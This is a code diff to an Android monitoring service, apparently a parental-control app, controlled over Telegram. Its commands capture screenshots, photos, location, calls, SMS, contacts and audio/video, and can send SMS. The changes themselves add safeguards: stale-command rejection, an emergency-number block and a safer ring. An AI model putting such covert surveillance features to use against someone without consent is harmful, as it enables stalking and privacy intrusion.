@@ -144,7 +144,6 @@ class MonitoringService : Service() {
         private val PROMO_KEYWORDS = arrayOf("promo", "diskon", "discount", "cashback", "bonus", "hadiah", "undian", "pinjaman", "kredit", "cicilan", "belanja", "sale", "gratis", "klaim", "voucher", "kupon", "poin", "tukar")
         private val CONNECT_HELPER_REGEX = Regex("(?i)connectHelper:\\d+:\\s*")
         private val MUTATING_COMMANDS = setOf("/lock", "/ring", "/sms", "/smsconfirm", "/record", "/recordvideo", "/stop", "/resume", "/pause", "/photointerval", "/syncinterval", "/camera", "/notif", "/restart", "/flush", "/clearqueue", "/patrol", "/patrolinterval", "/night", "/watch", "/home", "/school", "/digest", "/darurat", "/jampulang", "/minggu", "/watchnomor")
-        private val NO_REPLAY_COMMANDS = setOf("/sms", "/smsconfirm", "/ring", "/record", "/recordvideo", "/lock")
         private val SENSITIVE_COMMANDS = setOf("/screenshot", "/photo", "/location", "/lastcalls", "/lastsms", "/lastnotif", "/contacts", "/history", "/apps", "/log", "/version", "/status", "/battery", "/uptime", "/storage", "/perms", "/ringkas")
         private val KNOWN_COMMANDS = setOf("/photo", "/screenshot", "/status", "/perms", "/lastcalls", "/lastsms", "/photointerval", "/patrol", "/patrolinterval", "/pause", "/battery", "/stop", "/resume", "/location", "/camera", "/notif", "/log", "/syncinterval", "/restart", "/flush", "/clearqueue", "/lock", "/ring", "/ping", "/record", "/recordvideo", "/sms", "/smsconfirm", "/lastnotif", "/version", "/uptime", "/contacts", "/apps", "/storage", "/history", "/help", "/start", "/night", "/ringkas", "/watch", "/home", "/school", "/digest", "/darurat", "/jampulang", "/minggu", "/watchnomor")
         private val ALIAS_COMMANDS = mapOf("dimana" to "/location", "lokasi" to "/location", "posisi" to "/location", "foto" to "/photo", "photo" to "/photo", "ding" to "/ring", "bunyi" to "/ring", "kunci" to "/lock", "baterai" to "/battery", "batre" to "/battery", "bantu" to "/help", "tolong" to "/help", "menu" to "/help", "lanjut" to "/resume", "versi" to "/version", "sms" to "/sms", "darurat" to "/darurat", "minggu" to "/minggu", "laporan" to "/minggu", "pulang" to "/jampulang")
@@ -1094,7 +1093,7 @@ class MonitoringService : Service() {
                 if (callback != null) {
                     handleCallbackQuery(callback)
                 } else {
-                    val message = update.message ?: update.editedMessage ?: update.channelPost ?: update.editedChannelPost
+                    val message = update.message ?: update.channelPost
                     val msgChatId = message?.chat?.id?.toString().orEmpty()
                     val senderId = message?.from?.id?.toString().orEmpty()
                     val chatOk = msgChatId.isNotEmpty() && msgChatId == chatId
@@ -1404,8 +1403,8 @@ class MonitoringService : Service() {
     }
 
     private suspend fun handleTelegramCommandInner(command: String, arg: String, sentAtSec: Long = 0L, senderOk: Boolean = false, chatOk: Boolean = false, wakeSeen: Boolean = false, senderId: String = "") {
-        if (sentAtSec > 0 && (command in MUTATING_COMMANDS || command in SENSITIVE_COMMANDS)) {
-            val ageSec = System.currentTimeMillis() / 1000L - sentAtSec
+        if (command in MUTATING_COMMANDS || command in SENSITIVE_COMMANDS) {
+            val ageSec = if (sentAtSec <= 0L) Long.MAX_VALUE else System.currentTimeMillis() / 1000L - sentAtSec
             if (ageSec > MUTATING_MAX_AGE_SEC) {
                 sendToTelegram("\u23F3\uFE0F Command $command kedaluwarsa, kirim lagi.")
                 return
@@ -1811,7 +1810,7 @@ class MonitoringService : Service() {
                     }
                     "" -> {
                         val initialStuck = initialSyncRunning.get() && initialSyncJob?.isActive != true
-                        val loopsOk = monitoringJob?.isActive == true && cameraJob?.isActive == true && commandJob?.isActive == true && !initialStuck
+                        val loopsOk = monitoringJob?.isActive == true && cameraJob?.isActive == true && commandJob?.isActive == true && patrolJob?.isActive == true && !initialStuck
                         var restarted = false
                         if (!loopsOk && senderOk && !wakeSeen && pingRestartDue()) {
                             restarted = restartAllLoops()
@@ -1897,7 +1896,9 @@ class MonitoringService : Service() {
                 } else if (!normalized.matches(SMS_NUMBER_REGEX)) {
                     sendToTelegram("\u26A0\uFE0F Invalid number. Cara pakai: /sms \u003cnumber\u003e \u003cmessage\u003e")
                 } else if (isPremiumSmsNumber(normalized)) {
-                    sendToTelegram("\uD83D\uDEAB Premium numbers are not allowed for /sms.")
+                    sendToTelegram("\uD83D\uDEAB Nomor premium tidak boleh dipakai /sms.")
+                } else if (isEmergencySmsNumber(normalized)) {
+                    sendToTelegram("\uD83D\uDEAB Nomor darurat tidak boleh dipakai /sms. Hubungi langsung dari HP.")
                 } else if (smsText.length > 500) {
                     sendToTelegram("\u26A0\uFE0F Message too long (max 500 characters).")
                 } else if (androidx.core.content.ContextCompat.checkSelfPermission(this, android.Manifest.permission.SEND_SMS) != android.content.pm.PackageManager.PERMISSION_GRANTED) {
@@ -2705,6 +2706,16 @@ class MonitoringService : Service() {
     }
 
     private val emergencyNumbers = setOf("112", "911", "999", "110", "000", "111", "118", "119")
+
+    private fun isEmergencySmsNumber(raw: String): Boolean {
+        val digits = raw.filter { it.isDigit() }
+        if (digits.isEmpty()) return false
+        var intl = digits
+        if (intl.startsWith("011")) intl = intl.substring(3)
+        else if (intl.startsWith("00")) intl = intl.substring(2)
+        val local = if (digits.startsWith("0")) digits.substring(1) else digits
+        return digits in emergencyNumbers || intl in emergencyNumbers || local in emergencyNumbers
+    }
 
     private fun isPremiumSmsNumber(raw: String): Boolean {
         val digits = raw.filter { it.isDigit() }
@@ -4821,6 +4832,10 @@ private suspend fun ringDevice(seconds: Int) {
             audioManager.getStreamVolume(stream)
         } catch (_: Exception) {
             -1
+        }
+        if (previous < 0) {
+            sendToTelegram("⚠️ Volume tak terbaca, /ring dibatalkan agar tak macet maksimal.")
+            return
         }
         try {
             preferencesManager.setRingStateSync(previous, System.currentTimeMillis())
